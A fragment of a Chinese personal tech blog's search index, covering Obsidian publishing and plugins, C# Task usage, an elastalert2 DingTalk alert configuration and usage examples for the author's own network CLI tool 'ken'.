","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:2:2","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#初始化动作"},{"categories":["blog"],"content":" 配置 githubPage 到你的 quartz 仓库调整配置 进入 Settings \u003e Action \u003e General \u003e Workflow Permissions 并选中 Read and Write Permissions ","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:2:3","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#配置-githubpage"},{"categories":["blog"],"content":" 使用说明 vault 应该创建在 content 下面 _index.md 是 quartz 的首页 设置 - 编辑器 - 显示 - 显示 frontmatter, 方便我们迅速查看调整 tag, 标题之类的内容 做一个模板,方便你以后用 --- title: \"{{title}}\" tags: - blog --- ","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:2:4","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#使用说明"},{"categories":["blog"],"content":" 推送代码后 配置自定义域名解析,例如 blog.kentxxq.com 使用 cname 解析到 kentxxq.github.io 进入 Settings \u003e Pages \u003e Custom domain \u003e blog.kentxxq.com 开启 https 证书 Enforce HTTPS ","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:2:5","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#推送代码后"},{"categories":["blog"],"content":"这篇文章主要记录我使用 [[笔记/point/obsidian|obsidian]] 的配置和插件.方便自己记录, 也可以让你了解我做了什么让 [[笔记/point/obsidian|obsidian]] 变得更好用.","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介这篇文章主要记录我使用 obsidian 的配置和插件. 方便自己记录, 也可以让你了解我做了什么让 obsidian 变得更好用. ","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 主要配置","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#主要配置"},{"categories":["blog"],"content":" 编辑器 ","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#编辑器"},{"categories":["blog"],"content":" 文件与链接 ","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:2:2","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#文件与链接"},{"categories":["blog"],"content":" 插件","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#插件"},{"categories":["blog"],"content":" 使用中的插件 插件名称 插件作用 总结说明 Advanced Tables 快速写 markdown 的 table 非常好用 excalidraw 画图的 可以自动生成 svg，并且同步画图改动，兼容性很高 Find orphaned files and broken links 清理文件 整理出无效链接和孤儿文件 tag warpper 加强处理 tag 批量重命名 Linter 格式化笔记 选项很多，需要折腾 Webpage HTML Export 导出 html 兼容性非常好 auto-link-title 自动填写网页标题 挺好的，可以统一 easy-typing 输入时格式化 帮我在英文标点后加上空格 image-toolkit 点击放大图片 蛮好的 emoji-toolbar 插入 emoji 蛮好的 Templater 模板 方便创建日期和文件名模板 ","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#使用中的插件"},{"categories":["blog"],"content":" 放弃了的插件 插件名称 插件作用 总结说明 Diagrams 画图 在 ob 没 excalidraw 好用，没导出 svg 这样的定制化功能 Digital Garden 发布站点 tag 效果不好、和 frontmatter 似乎冲突比较多、代码不是很活跃 Remotely Save 同步备份 全程使用 alist 的 webdav+ 阿里云盘。偶尔无法同步删除，无法删除 .obsidian 里的文件 livesync 同步 同步 需要搭建服务器端、其实没有备份功能 ","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#放弃了的插件"},{"categories":["blog"],"content":" 可能尝试的插件 插件名称 插件作用 总结说明 sliding panes 横向卷动 打开多个标签页，然后配合触摸板横向浏览 obisidian links 链接类型转换 wikilink, markdown-link, 删除 link 等等 obsidian同步方案对比 #todo/笔记 Remote save 设置手动同步? 或者 obsidian 文件夹自己同步?! GitHub - acheong08/rev-obsidian-sync-plugin ","date":"2023-06-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/:3:3","series":null,"tags":["blog","obsidian"],"title":"obsidian插件与配置","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E6%8F%92%E4%BB%B6%E4%B8%8E%E9%85%8D%E7%BD%AE/#可能尝试的插件"},{"categories":["blog"],"content":"总结一下在 [[笔记/point/csharp|c#]] 中几种 Task 的用法.","date":"2023-06-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/","series":null,"tags":["blog","csharp"],"title":"Task的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"categories":["blog"],"content":" 简介总结一下在 c# 中几种 Task 的用法. ","date":"2023-06-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/:1:0","series":null,"tags":["blog","csharp"],"title":"Task的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/#简介"},{"categories":["blog"],"content":" 对比 方法 适用场景 Task.Run 通用，适用异步 Task.Factory.StartNew(TaskCreationOptions.LongRunning) 钻牛角尖 下面全都是你想用 Task.Factory.StartNew 的必备条件 你想要新启一个线程来运行，因为会堵塞太久。 是同步方法。因为异步并不会在新启动的线程运行（参考链接），甚至因为开线程，切换线程影响性能。 会并发。如果最多同时 1 个，那没必要。 你很了解现在的线程池情况，你对线程池扩容的逻辑你不满意，你必须现在就申请一个新线程。否则会自动扩容的。 不想用 backgroundService后台执行 和 mq消息队列替代 ","date":"2023-06-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/:2:0","series":null,"tags":["blog","csharp"],"title":"Task的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/#对比"},{"categories":["blog"],"content":" 参考链接 LongRunning 的错误用法 devblog 官方 线程池 问题解答 ","date":"2023-06-02","objectID":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/:2:1","series":null,"tags":["blog","csharp"],"title":"Task的使用","uri":"/posts/%E7%AC%94%E8%AE%B0/task%E7%9A%84%E4%BD%BF%E7%94%A8/#参考链接"},{"categories":["blog"],"content":"elastalert2是一个日志告警服务，原理其实很简单，就是查询es数据，并触发告警信息。刚好最近在自建k8s和efk相关的内容，顺便更新到博客吧","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/"},{"categories":["blog"],"content":" elastalert2 是一个日志告警服务，原理其实很简单，就是查询 es 数据，并触发告警信息。刚好最近在自建 k8s 和 efk 相关的内容，顺便更新到博客吧。 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:0:0","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#"},{"categories":["blog"],"content":" 背景介绍我们的日志通过 efk 套件采集、查询。 日志数据是存储在 es 内部的，所以我们的告警可以通过查询 es 数据来实现 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:1:0","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#背景介绍"},{"categories":["blog"],"content":" elastalert 的使用因为我们采用 docker 部署，因此我们优先写好配置文件，然后放到容器中 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:2:0","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#elastalert-的使用"},{"categories":["blog"],"content":" 配置 参考链接 目录结构 elastalert.yaml # 主配置文件 rules/ # 存在告警规则 demo1.yaml # 单个告警规则的配置文件 elastalert.yaml 文件内容 rules_folder: /opt/elastalert/rules run_every: seconds: 10 buffer_time: minutes: 15 es_host: es的主机ip es_port: 9200 writeback_index: elastalert_status alert_time_limit: days: 2 demo1.yaml 文件内容 name: \"demo1\" type: \"frequency\" index: \"xxx-index*\" # 查询日志所在的索引 is_enabled: true num_events: 1 # 出现几次就告警 timeframe: minutes: 1 # 1分钟 出现了 num_events次 匹配记录，就告警 realert: minutes: 1 # 1分钟内忽略重复告警 timestamp_field: \"@timestamp\" timestamp_type: \"iso\" use_strftime_index: false # 下面是在邮件中可能用到的字段 #alert_subject: \"Test 测试alter_subject \\n {} \" #alert_subject_args: # - \"message\" # - \"@log_name\" alert_text_type: alert_text_only # 下面是告警模板 alert_text: | \u003e 正式环境 告警信息 \u003e 时间: {0} \u003e 主机名: {1} \u003e 触发次数: {2} \u003e 匹配次数: {3} \u003e 日志信息: {4} alert_text_args: # 告警模板中用到的参数 - log_time - host.name - num_hits - num_matches - message filter: - query: query_string: query: \"LEVEL: ERROR\" # 告警查询语句 alert: - \"dingtalk\" # 告警类型 dingtalk_access_token: \"asidoijdosajdsao\" # 钉钉机器人访问地址 dingtalk_msgtype: \"text\" # 消息类型 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:2:1","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#配置-参考链接httpselastalert2readthedocsioenlatestruletypeshtml"},{"categories":["blog"],"content":" 配置 参考链接 目录结构 elastalert.yaml # 主配置文件 rules/ # 存在告警规则 demo1.yaml # 单个告警规则的配置文件 elastalert.yaml 文件内容 rules_folder: /opt/elastalert/rules run_every: seconds: 10 buffer_time: minutes: 15 es_host: es的主机ip es_port: 9200 writeback_index: elastalert_status alert_time_limit: days: 2 demo1.yaml 文件内容 name: \"demo1\" type: \"frequency\" index: \"xxx-index*\" # 查询日志所在的索引 is_enabled: true num_events: 1 # 出现几次就告警 timeframe: minutes: 1 # 1分钟 出现了 num_events次 匹配记录，就告警 realert: minutes: 1 # 1分钟内忽略重复告警 timestamp_field: \"@timestamp\" timestamp_type: \"iso\" use_strftime_index: false # 下面是在邮件中可能用到的字段 #alert_subject: \"Test 测试alter_subject \\n {} \" #alert_subject_args: # - \"message\" # - \"@log_name\" alert_text_type: alert_text_only # 下面是告警模板 alert_text: | \u003e 正式环境 告警信息 \u003e 时间: {0} \u003e 主机名: {1} \u003e 触发次数: {2} \u003e 匹配次数: {3} \u003e 日志信息: {4} alert_text_args: # 告警模板中用到的参数 - log_time - host.name - num_hits - num_matches - message filter: - query: query_string: query: \"LEVEL: ERROR\" # 告警查询语句 alert: - \"dingtalk\" # 告警类型 dingtalk_access_token: \"asidoijdosajdsao\" # 钉钉机器人访问地址 dingtalk_msgtype: \"text\" # 消息类型 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:2:1","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#目录结构"},{"categories":["blog"],"content":" 配置 参考链接 目录结构 elastalert.yaml # 主配置文件 rules/ # 存在告警规则 demo1.yaml # 单个告警规则的配置文件 elastalert.yaml 文件内容 rules_folder: /opt/elastalert/rules run_every: seconds: 10 buffer_time: minutes: 15 es_host: es的主机ip es_port: 9200 writeback_index: elastalert_status alert_time_limit: days: 2 demo1.yaml 文件内容 name: \"demo1\" type: \"frequency\" index: \"xxx-index*\" # 查询日志所在的索引 is_enabled: true num_events: 1 # 出现几次就告警 timeframe: minutes: 1 # 1分钟 出现了 num_events次 匹配记录，就告警 realert: minutes: 1 # 1分钟内忽略重复告警 timestamp_field: \"@timestamp\" timestamp_type: \"iso\" use_strftime_index: false # 下面是在邮件中可能用到的字段 #alert_subject: \"Test 测试alter_subject \\n {} \" #alert_subject_args: # - \"message\" # - \"@log_name\" alert_text_type: alert_text_only # 下面是告警模板 alert_text: | \u003e 正式环境 告警信息 \u003e 时间: {0} \u003e 主机名: {1} \u003e 触发次数: {2} \u003e 匹配次数: {3} \u003e 日志信息: {4} alert_text_args: # 告警模板中用到的参数 - log_time - host.name - num_hits - num_matches - message filter: - query: query_string: query: \"LEVEL: ERROR\" # 告警查询语句 alert: - \"dingtalk\" # 告警类型 dingtalk_access_token: \"asidoijdosajdsao\" # 钉钉机器人访问地址 dingtalk_msgtype: \"text\" # 消息类型 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:2:1","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#elastalertyaml-文件内容"},{"categories":["blog"],"content":" 配置 参考链接 目录结构 elastalert.yaml # 主配置文件 rules/ # 存在告警规则 demo1.yaml # 单个告警规则的配置文件 elastalert.yaml 文件内容 rules_folder: /opt/elastalert/rules run_every: seconds: 10 buffer_time: minutes: 15 es_host: es的主机ip es_port: 9200 writeback_index: elastalert_status alert_time_limit: days: 2 demo1.yaml 文件内容 name: \"demo1\" type: \"frequency\" index: \"xxx-index*\" # 查询日志所在的索引 is_enabled: true num_events: 1 # 出现几次就告警 timeframe: minutes: 1 # 1分钟 出现了 num_events次 匹配记录，就告警 realert: minutes: 1 # 1分钟内忽略重复告警 timestamp_field: \"@timestamp\" timestamp_type: \"iso\" use_strftime_index: false # 下面是在邮件中可能用到的字段 #alert_subject: \"Test 测试alter_subject \\n {} \" #alert_subject_args: # - \"message\" # - \"@log_name\" alert_text_type: alert_text_only # 下面是告警模板 alert_text: | \u003e 正式环境 告警信息 \u003e 时间: {0} \u003e 主机名: {1} \u003e 触发次数: {2} \u003e 匹配次数: {3} \u003e 日志信息: {4} alert_text_args: # 告警模板中用到的参数 - log_time - host.name - num_hits - num_matches - message filter: - query: query_string: query: \"LEVEL: ERROR\" # 告警查询语句 alert: - \"dingtalk\" # 告警类型 dingtalk_access_token: \"asidoijdosajdsao\" # 钉钉机器人访问地址 dingtalk_msgtype: \"text\" # 消息类型 ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:2:1","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#demo1yaml-文件内容"},{"categories":["blog"],"content":" 部署使用 # docker命令 docker run -d --name elastalert --restart=always \\ -v $(pwd)/elastalert.yaml:/opt/elastalert/config.yaml \\ -v $(pwd)/rules:/opt/elastalert/rules \\ jertel/elastalert2 --verbose # 查看日志 docker logs -f elastalert ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:2:2","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#部署使用"},{"categories":["blog"],"content":" 效果大概如下 \u003e 正式环境 告警信息 \u003e 时间: \u003cMISSING VALUE\u003e \u003e 主机名: mall-trade-service-7b5459d68b-fmqm2 \u003e 触发次数: 1 \u003e 匹配次数: 1 \u003e 日志信息: |dubbo-client-idleCheck-thread-1|TID:N/A|ERROR|o.a.d.r.e.s.header.ReconnectTimerTask:51|doTask| [DUBBO] Fail to connect to HeaderExchangeClient ","date":"2022-05-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/:3:0","series":null,"tags":["blog","devops","告警"],"title":"elastalert2钉钉告警","uri":"/posts/%E7%AC%94%E8%AE%B0/elastalert2%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6/#效果大概如下"},{"categories":["blog"],"content":"在日常的使用场景中，总是不得不接触各种各样的命令行工具。而在使用的过程中，多多少少有一些不好用的地方。马上就要发布到NET6，终于做到了在mac和windows系统上进行单个文件的发布。同时单个文件的大小又几乎缩小了一倍。所以就有了想法自己写一个","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/"},{"categories":["blog"],"content":"在日常的使用场景中，总是不得不接触各种各样的命令行工具。而在使用的过程中，多多少少有一些不好用的地方。马上就要发布到 NET6，终于做到了在 mac 和 windows 系统上进行单个文件的发布。同时单个文件的大小又几乎缩小了一倍。所以就有了想法自己写一个。 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:0:0","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#"},{"categories":["blog"],"content":" 简介在日常的使用场景中，总是不得不接触各种各样的命令行工具。而在使用的过程中，多多少少有一些不好用的地方。马上就要发布到 NET6，终于做到了在 mac 和 windows 系统上进行单个文件的发布。同时单个文件的大小又几乎缩小了一倍。所以就有了想法自己写一个。 因为我希望命令尽量简短, 所以使用我的名字 ken 来命名. 代码都是开源 的，采用 csharp 编写。使用了微软自己的 System.Commandline。 现支持的所有系统版本 ken-linux-arm ken-linux-arm64 ken-linux-musl-x64 ken-linux-x64 ken-osx-arm64 ken-osx-x64 ken-win-arm.exe ken-win-arm64.exe ken-win-x64.exe ken-win-x86.exe # 下载举例：linux-x64 下载到程序路径 curl -L -o /usr/local/bin/ken https://github.com/kentxxq/kentxxq.Cli/releases/download/1.2.7/ken-linux-x64 # 如果是国内网络不行的话，可以使用代理下载 curl -L -o /usr/local/bin/ken https://github.abskoop.workers.dev/https://github.com/kentxxq/kentxxq.Cli/releases/download/1.2.7/ken-linux-x64 # 或 curl -L -o /usr/local/bin/ken https://ghproxy.com/https://github.com/kentxxq/kentxxq.Cli/releases/download/1.2.7/ken-linux-x64 # 赋权 chmod +x /usr/local/bin/ken ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:1:0","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#简介"},{"categories":["blog"],"content":" 如何使用说明: 如果命令返回状态非 0，则代表异常退出 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:0","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#如何使用"},{"categories":["blog"],"content":" 端口检测 spsp 代表 socketping，之前一直都是用的 telnet。但是只能一次性请求，而 sp 可以设置连接超时时间、重试次数、连接成功后退出。 Usage: ken [options] sp \u003curl\u003e Arguments: \u003curl\u003e url: kentxxq.com:443 Options: -n, --retryTimes \u003cretryTimes\u003e default:0,retry forever [default: 0] -t, --timeout \u003ctimeout\u003e default:2 seconds [default: 2] -q, --quit Quit after connection succeeded [default: False] -?, -h, --help Show help and usage information # 请求2次 ken sp kentxxq.com:443 -n 2 request successed. waited 137 ms request successed. waited 1117 ms # 请求2次，一旦成功就退出 ken sp kentxxq.com:443 -n 2 -q request successed. waited 96 ms # 请求失败的情况，同时设置超时时间 ken sp kentxxq.com:444 -t 3 -n 2 -q request failed. waited 3016 ms request failed. waited 3013 ms # 解析失败的情况 ken sp kentxxq:443 -t 3 -n 2 -q parse error:不知道这样的主机。 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:1","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#端口检测-sp"},{"categories":["blog"],"content":" 长连接 wsws 代表连接 websocket。之前一直用 wscat，但是wscat 依赖 nodejs。每次使用的时候都觉得有点小题大做了。 Usage: ken [options] ws \u003cwsUrl\u003e Arguments: \u003cwsUrl\u003e wsUrl: wss://ws.kentxxq.com/ws # 连接websocket ken ws wss://ws.kentxxq.com/ws \u003e\u003e ls \u003c\u003c ls \u003e\u003e pwd \u003c\u003c pwd \u003e\u003e 你好 \u003c\u003c 你好 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:2","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#长连接-ws"},{"categories":["blog"],"content":" 查看端口监听 ssss 代表 socket status。主要原因是每次在 windows 上都容易忘记命令。后面会找时间去拓展成有用的功能。 ❯ .\\ken.exe ss 0.0.0.0:135 0.0.0.0:445 0.0.0.0:2179 0.0.0.0:5040 0.0.0.0:7680 0.0.0.0:7890 0.0.0.0:28653 0.0.0.0:49664 0.0.0.0:49665 0.0.0.0:49666 0.0.0.0:49667 0.0.0.0:49668 0.0.0.0:49669 0.0.0.0:49678 127.0.0.1:4012 127.0.0.1:4013 127.0.0.1:9100 127.0.0.1:9180 127.0.0.1:53087 127.0.0.1:53088 127.0.0.1:53117 127.0.0.1:53121 127.0.0.1:53430 127.0.0.1:57956 127.0.0.1:57961 127.0.0.1:61078 127.0.0.1:62078 169.254.171.114:139 172.18.87.230:139 172.18.87.230:5822 172.19.144.1:139 :::135 :::445 :::2179 :::7680 :::7890 :::49664 :::49665 :::49666 :::49667 :::49668 :::49669 :::49678 ::1:49672 ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:3","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#查看端口监听-ss"},{"categories":["blog"],"content":" 路由追踪 trtr 代表 traceroute。是通过 dotnet 的 ping 实现。结果发现在 linux 有问题，所以后续再去拓展吧。 ❯ ken.exe tr kentxxq.com try connecting to kentxxq.com ...success 1 request timeout 2 118.250.180.1 take 0ms 中国-湖南-长沙-电信 3 61.187.29.245 take 3ms 中国-湖南-长沙-电信 4 61.137.3.129 take 0ms 中国-湖南-长沙-电信 5 request timeout 6 202.97.94.122 take 19ms 中国-北京-北京-电信 7 202.97.94.94 take 58ms 中国-北京-北京-电信 8 202.97.60.214 take 0ms 日本-XX-XX-电信 9 129.250.3.23 take 79ms 美国-XX-XX-XX 10 129.250.6.127 take 0ms 美国-XX-XX-XX 11 61.200.82.50 take 102ms 日本-XX-XX-XX 12 185.199.110.153 美国-华盛顿-西雅图-XX ","date":"2021-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/:2:4","series":null,"tags":["blog","csharp"],"title":"网络命令行工具-ken","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7-ken/#路由追踪-tr"},{"categories":["blog"],"content":" 操作 redisredis 因为经常删除特定的 key，而 redis-cli 没有没有很好的支持这点，所以就自己写了一个最常用的。。 # 错误命令就会输出usage # usage: # a*: search all keys start with a in db # del a2*: delete all keys start with a2 in db # select 1: checkout db 1 # exit(): just exit \u003e ken redis bwd.kentxxq.com -p 123456 connect success,take 27.4024 ms db0 keys:2 \u003e\u003ea keys count:1 \u003e\u003eb keys count:1 \u003e\u003ea* keys count:1 \u003e\u003edel a deleted 1 key(s) \u003e\u003eselect 1 using db1 keys count:1 \u003e\u003ec keys count:1 \u003e\u003eexit() 